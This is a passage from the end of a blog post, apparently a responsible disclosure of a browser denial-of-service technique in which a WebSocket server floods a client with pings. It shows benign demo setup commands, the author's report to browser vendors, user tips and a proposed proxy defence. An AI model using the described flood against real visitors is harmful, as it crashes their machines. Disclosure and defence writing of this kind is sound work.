<span class=line><span style=color:#6f42c1;--shiki-dark:#B392F0>go</span><span style=color:#032f62;--shiki-dark:#9ECBFF> run</span><span style=color:#032f62;--shiki-dark:#9ECBFF> main.go</span></span></code></pre></div><ol start=5><li>Start a simple HTTP server to serve <code>index.html</code>: (If port 3002 is not available, pick another one, e.g., 3003…)</li></ol><div class=code-block-wrapper><button aria-label="Copy code" class=code-copy-button type=button></button><pre class="astro-code astro-code-themes github-dark github-light" data-copy-button-added=true data-language=bash style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6f42c1;--shiki-dark:#B392F0>python3</span><span style=color:#005cc5;--shiki-dark:#79B8FF> -m</span><span style=color:#032f62;--shiki-dark:#9ECBFF> http.server</span><span style=color:#005cc5;--shiki-dark:#79B8FF> 3002</span></span></code></pre></div><ol start=6><li>Open the page in your browser. For example: (If port 3002 was not available, use the other port you picked)</li></ol><div class=code-block-wrapper><button aria-label="Copy code" class=code-copy-button type=button></button><pre class="astro-code astro-code-themes github-dark github-light" data-copy-button-added=true data-language=plaintext style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span>http://localhost:3002</span></span></code></pre></div><hr><p>Of course, the reason I’m writing these lines is not to enable script kiddies to annoy others, but to highlight a problem and propose a solution. Just to clarify, I am publishing this article only after having contacted major browser developers and submitted bug reports to ensure better client-side security checks for everyone.</p><p>Until all browsers implement a check, you can take care of yourself, by:</p><ul><li>If visiting a site crashed your computer, be aware that it’s possible and that it may be just this method described above used. Don’t panic and don’t believe everything.</li><li>If you develop an application that depends on a third-party WebSocket, then make sure that you really trust the provider of it.</li></ul><hr><p>It’s the browsers that need to protect you from such a problem since the WebSocket API of them (which is kind of the same across all of them) doesn’t expose you the pings. This means that even if you write code that may find abnormal load of messages — good, perfect — but… you will never be able to see an abnormal load of pings, as you don’t get them at all like they don’t exist.</p><p>Using a custom proxy made to bypass and check the connection could be a real solution, as a proxy being a whole program, freed from the limitations of browsers, could detect abnormal loads of everything, including pings and kill the connection if needed.</p><p>I don’t provide the code to such a thing because this is simply opening other problems like what if someone abuses your proxy, so it’s a solution that needs to be implemented carefully and maybe customized.</p><hr><p>Back to browsers, it’s worth noting that there are actually two other ways to have a WebSocket connection that claim to try to solve such problems. Well, they don’t talk exactly about the problem above (especially with the ping case), but they talk about almost the same and they call it <strong>“backpressure”</strong>. From Mozilla Developer Network:</p><blockquote><p><strong>Backpressure</strong> An important concept in streams is backpressure — this is the process by which a single stream or a pipe chain regulates the speed of reading/writing. When a stream later in the chain is still busy and isn’t yet ready to accept more chunks, it sends a signal backwards through the chain to tell earlier transform streams (or the original source) to slow down delivery so that you don’t end up with a bottleneck anywhere.</p></blockquote><p>Those two other ways are <strong>WebTransport API</strong> and <strong>Streams API</strong>. Both are great but very fresh, in contrast to the WebSocket API which has been around for more than a decade. They are so fresh that the first is not supported by Safari and the second is not supported by Firefox. And even the browsers that support one or the other do so only in very recent versions (and experimentally, I would guess).</p><hr><p>[Reference] <a href=https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Concepts#backpressure rel="nofollow noopener noreferrer external" target=_blank>https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Concepts#backpressure</a></p></div></article></main><footer class="font-navbar leading-1.25em lg:text-3.5 text-3" lg="uno-desktop-column bottom-20"><p><a href=/atom.xml class="hover:c-primary highlight-hover transition-colors after:bottom-0.35em hover:font-medium py-0.8 relative" rel="noopener noreferrer" target=_blank><span class="transition-font-weight absolute flex inset-0 items-center justify-center whitespace-nowrap">RSS </span><span class="inline-block font-medium opacity-0" aria-hidden=true>RSS </span></a>&nbsp;/ <a href=mailto:hello@simplecode.gr class="hover:c-primary highlight-hover transition-colors after:bottom-0.35em hover:font-medium py-0.8 relative" rel="noopener noreferrer" target=_blank><span class="transition-font-weight absolute flex inset-0 items-center justify-center whitespace-nowrap">Email </span><span class="inline-block font-medium opacity-0" aria-hidden=true>Email </span></a>&nbsp;</p><p>© 2025 Simplecode</p><p>Powered by <a href=https://astro.build/ class="hover:c-primary highlight-hover transition-colors after:bottom-0.35em hover:font-medium py-0.8 relative" rel="noopener noreferrer" target=_blank><span class="transition-font-weight absolute flex inset-0 items-center justify-center whitespace-nowrap">Astro </span><span class="inline-block font-medium opacity-0" aria-hidden=true>Astro </span></a>&nbsp;and <a href=https://github.com/radishzzz/astro-theme-retypeset class="hover:c-primary highlight-hover transition-colors after:bottom-0.35em hover:font-medium py-0.8 relative" rel="noopener noreferrer" target=_blank><span class="transition-font-weight absolute flex inset-0 items-center justify-center whitespace-nowrap">Retypeset </span><span class="inline-block font-medium opacity-0" aria-hidden=true>Retypeset</span></a></p></footer></div><script type=module src=/_astro/GsapAnimation.astro_astro_type_script_index_0_lang.B-SpNpsK.js></script><div class="absolute flex gap-6 lg:bottom-48 lg:fixed lg:right-[max(5rem,calc(50vw-35rem))] lg:top-auto lg:w-14rem min-[823px]:max-[1024px]:right-[calc(50vw-22rem)] right-7.25vw top-14.6"><button aria-label="Switch light/dark theme" class="hover:c-primary active:scale-90 aspect-square c-secondary w-4" id=theme-toggle-button><svg aria-hidden=true fill=currentColor viewBox="0 0 24 24"><path d=M12,.5C5.6.5.4,5.6.4,12s5.1,11.5,11.6,11.5,11.5-5.1,11.5-11.5S18.4.5,12,.5M12,21.5C5.9,21.5,1,17.3,1,12S5.9,2.6,12,2.6s11,4.2,11,9.5-4.9,9.4-11,9.4 /></svg></button></div><script>!function(){function e(){document.documentElement.classList.toggle("dark");const e=document.documentElement.classList.contains("dark"),t=document.head.querySelector('meta[name="theme-color"]');t?.setAttribute("content",e?"oklch(22% 0.005 298)":"oklch(96% 0.005 298)"),localStorage.setItem("theme",e?"dark":"light"),document.dispatchEvent(new Event("theme-changed"))}function t(){const t=document.getElementById("theme-toggle-button");t&&t.addEventListener("click",(()=>{if(document.documentElement.classList.contains("reduce-motion")||!document.startViewTransition)return void e();document.documentElement.style.setProperty("view-transition-name","animation-theme-toggle"),document.documentElement.setAttribute("data-theme-changing","");document.startViewTransition(e).finished.then((()=>{document.documentElement.style.removeProperty("view-transition-name"),document.documentElement.removeAttribute("data-theme-changing")}))}))}t(),document.addEventListener("astro:after-swap",t)}()</script><script type=module>const s={copy:'<svg\n      viewBox="0 0 24 24"\n      fill="currentColor"\n    >\n      <path d="M6.9.8v18h14.5V.8zm12.8 16h-11v-14h11z"/>\n      <path d="M4.3 21.2V5.6l-1.7.5v17.1h14.3l.6-2z"/>\n    </svg>',success:'<svg\n      viewBox="0 0 24 24"\n      fill="currentColor"\n    >\n      <path d="m23.1 6.4-1.3-1.3L9.4 16.6l-6.3-5.4-1.2 1.2L9.4 20z"/>\n    </svg>'},c=new WeakMap;async function a(e){const t=e.parentElement?.querySelector("pre code");if(!t)return;const n=t.textContent??"";if(n)try{await navigator.clipboard.writeText(n);const t=c.get(e);t&&clearTimeout(t),e.innerHTML=s.success,e.classList.add("copy-success");const o=setTimeout((()=>{e.innerHTML=s.copy,e.classList.remove("copy-success"),c.delete(e)}),1500);c.set(e,o)}catch(e){console.error("Failed to copy code",e?.message??String(e))}}function n(){document.querySelectorAll(".code-copy-button:not([data-initialized])").forEach((e=>{e.innerHTML=s.copy,e.setAttribute("data-initialized","true")}))}document.addEventListener("click",(e=>{if(!(e.target instanceof HTMLElement))return;const t=e.target.closest(".code-copy-button");t&&a(t)}),{passive:!0}),n(),document.addEventListener("astro:page-load",n)</script><script type=module src=/_astro/PhotoSwipe.astro_astro_type_script_index_0_lang.CqaaJoMq.js></script><script type=module>async function m(t){const e=t.dataset.repo;if(!e)return;const n=t.getElementsByClassName("gc-owner-avatar")[0],o=t.getElementsByClassName("gc-repo-description")[0],a=t.getElementsByClassName("gc-stars-count")[0],r=t.getElementsByClassName("gc-forks-count")[0],s=t.getElementsByClassName("gc-license-info")[0];try{const t=await fetch(`https://api.github.com/repos/${e}`);if(!t.ok)return void(o&&(o.textContent="Loading failed."));const c=await t.json();n&&c.owner?.avatar_url&&(n.style.backgroundImage=`url(${c.owner.avatar_url})`),o&&(o.textContent=c.description??"No description"),a&&(a.textContent=new Intl.NumberFormat("en",{notation:"compact",maximumFractionDigits:1}).format(c.stargazers_count??0)),r&&(r.textContent=new Intl.NumberFormat("en",{notation:"compact",maximumFractionDigits:1}).format(c.forks_count??0)),s&&(s.textContent=c.license?.spdx_id??"No License")}catch(t){console.error(`Failed to fetch ${e}:`,t?.message??String(t))}}function l(){const t=document.getElementsByClassName("gc-container");if(0===t.length)return;const e=new IntersectionObserver((t=>{t.forEach((t=>{t.isIntersecting&&(m(t.target),e.unobserve(t.target))}))}),{rootMargin:"200px"});Array.from(t).forEach((t=>e.observe(t)))}l(),document.addEventListener("astro:page-load",l)</script></body></html>